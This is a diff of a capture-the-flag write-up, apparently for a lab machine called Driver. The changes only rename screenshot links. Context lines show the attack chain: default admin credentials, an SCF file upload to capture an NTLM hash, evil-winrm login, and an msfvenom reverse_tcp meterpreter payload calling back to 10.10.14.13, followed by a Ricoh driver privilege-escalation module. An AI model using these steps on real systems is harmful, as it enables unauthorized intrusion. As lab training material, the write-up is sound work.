@@ -23,15 +23,15 @@ Interestingly, WinRM is open.
 
 Port 80 requires credentials to access.
 
-![](<../../../.gitbook/assets/image%20(1064).png>)
+![](../../../.gitbook/assets/driver-1.png)
 
 I tested weak credentials of `admin:admin`, and it worked. The page is some type of printer service panel.
 
-![](<../../../.gitbook/assets/image%20(3003).png>)
+![](../../../.gitbook/assets/driver-4.png)
 
 The only working part is the Firmware Updates, which redirects us to this page:
 
-![](<../../../.gitbook/assets/image%20(3892).png>)
+![](../../../.gitbook/assets/driver-6.png)
 
 This would take any file and upload them to the file share, and a user would open it. Because it uploads to SMB, we can create a malicious SCF File to exploit this.
 
@@ -49,7 +49,7 @@ Command=ToggleDesktop
 
 Once uploaded, `responder` would capture a hash:
 
-![](<../../../.gitbook/assets/image%20(979).png>)
+![](../../../.gitbook/assets/driver-8.png)
 
 This can be cracked easily:
 
@@ -67,7 +67,7 @@ Session completed.
 
 We can then log in using `evil-winrm` since port 5985 is open.
 
-![](<../../../.gitbook/assets/image%20(787).png>)
+![](../../../.gitbook/assets/driver-7.png)
 
 ## Privilege Escalation
 
@@ -75,7 +75,7 @@ We can then log in using `evil-winrm` since port 5985 is open.
 
 I ran a WinPEAS scan to enumerate for me. While reading the output, we can see that there's Powershell history files:
 
-![](<../../../.gitbook/assets/image%20(366).png>)
+![](../../../.gitbook/assets/driver-5.png)
 
 Here's the file content:
 
@@ -92,7 +92,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f 
 
 Then, we need to upload it and start `exploit/multi/handler`.
 
-![](<../../../.gitbook/assets/image%20(2321).png>)
+![](../../../.gitbook/assets/driver-2.png)
 
 Then, we need to first run `migrate -N explorer.exe` , then `background` this and use the `exploit/windows/local/ricoh_driver_privesc` module. Then, run the following:
 
@@ -105,6 +105,6 @@ exploit
 
 Afterwards, we would get a shell as the SYSTEM user.
 
-![](<../../../.gitbook/assets/image%20(2684).png>)
+![](../../../.gitbook/assets/driver-3.png)
 
 Rooted!
